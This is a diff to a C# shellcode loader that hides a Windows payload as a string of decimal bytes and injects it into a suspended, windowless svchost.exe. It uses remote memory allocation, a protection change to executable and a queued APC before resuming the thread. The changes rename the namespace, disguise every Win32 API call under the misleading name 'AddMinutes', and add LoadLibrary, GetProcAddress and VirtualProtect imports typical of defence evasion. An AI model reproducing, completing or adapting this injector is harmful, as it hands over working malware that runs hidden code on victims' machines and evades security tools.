@@ -12,13 +12,14 @@ using System;
 using System.Diagnostics;
 using System.Runtime.InteropServices;
 
-namespace svchostExample
+namespace Code
 {
     class Program
     {
 
         static void Main(string[] args)
         {
+
 
             string scode = "072 131 228 240 232 192 000 000 000 065 081 065 080 082 081 086 072 049 210 101 072 139 082 096 072 139 082 024 072 139 082 032 072 "+
                      "139 114 080 072 015 183 074 074 077 049 201 072 049 192 172 060 097 124 002 044 032 065 193 201 013 065 001 193 226 237 082 065 081 "+
@@ -34,21 +35,22 @@ namespace svchostExample
                      "072 141 068 036 024 198 000 104 072 137 230 086 080 065 080 065 080 065 080 073 255 192 065 080 073 255 200 077 137 193 076 137 193 "+
                      "065 186 121 204 063 134 255 213 072 049 210 072 255 202 139 014 065 186 008 135 029 096 255 213 187 240 181 162 086 065 186 166 149 "+
                      "189 157 255 213 072 131 196 040 060 006 124 010 128 251 224 117 005 187 071 019 114 111 106 000 089 065 137 218 255 213";
-            int scodeLength = 460;
-	          STARTUPINFO si = new STARTUPINFO();
+
+            int scodeLength = (scode.Length / 4) + 1;
+            bool result;
+            STARTUPINFO si = new STARTUPINFO();
             PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
-            bool success = AddMinutes("c:\\windows\\system32\\svchost.exe", "c:\\windows\\system32\\svchost.exe -k LocalSystemNetworkResticted", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, "C:\\Windows\\System32\\", ref si, out pi); // CreateProcess
-            IntPtr allocMemAddress = AddMinutes(pi.hProcess, IntPtr.Zero, scodeLength, MEM_COMMIT, PAGE_READWRITE); // VirtualAllocEx
+            result = AddMinutes("c:\\windows\\system32\\svchost.exe", "c:\\windows\\system32\\svchost.exe -k LocalSystemNetworkResticted", IntPtr.Zero, IntPtr.Zero, false, ProcessCreationFlags.CREATE_SUSPENDED | ProcessCreationFlags.CREATE_NO_WINDOW, IntPtr.Zero, "C:\\Windows\\System32\\", ref si, out pi); // CreateProcess
+            IntPtr allocMemAddress = AddMinutes(pi.hProcess, IntPtr.Zero, scodeLength + 1, MEM_COMMIT, PAGE_READWRITE); // VirtualAllocEx
             IntPtr allocMemAddressCopy;
             allocMemAddressCopy = allocMemAddress;
             IntPtr bytesWritten = IntPtr.Zero;
-            bool result;
             uint CPR = 0;
             byte [] data = new byte [] { 000 };
             string buffer = "";
             int jumpPos = 0;
 
-            for (int i = 0; i <= (scodeLength - 2); i++)
+            for (int i = 1; i <= (scodeLength); i++)
             {
                 buffer = scode.Substring(jumpPos, 3);
    					    data[0] = Byte.Parse(buffer);
@@ -57,7 +59,6 @@ namespace svchostExample
      					  jumpPos = jumpPos + 4;
      			  }
 
-
             result = AddMinutes(pi.hProcess, allocMemAddressCopy, scodeLength, PAGE_EXECUTE_READ, out CPR); // VirtualProtectEx
             Process targetProc = Process.GetProcessById((int)pi.dwProcessId);
             ProcessThreadCollection currentThreads = targetProc.Threads;
@@ -65,8 +66,20 @@ namespace svchostExample
             IntPtr APCPtr = AddMinutes(allocMemAddressCopy, openThreadPtr, IntPtr.Zero); // QueueUserAPC
             IntPtr ThreadHandler = pi.hThread;
             AddMinutes(ThreadHandler); // ResumeThread
-
         }
+
+        class Win32
+        {
+            [DllImport("kernel32")]
+            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+            [DllImport("kernel32")]
+            public static extern IntPtr LoadLibrary(string name);
+
+            [DllImport("kernel32")]
+            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        }
+
 
             private static UInt32 MEM_COMMIT = 0x1000;
     				private static UInt32 PAGE_READWRITE = 0x04;
@@ -188,6 +201,7 @@ namespace svchostExample
       }
 
 }
+
 
 
 ```
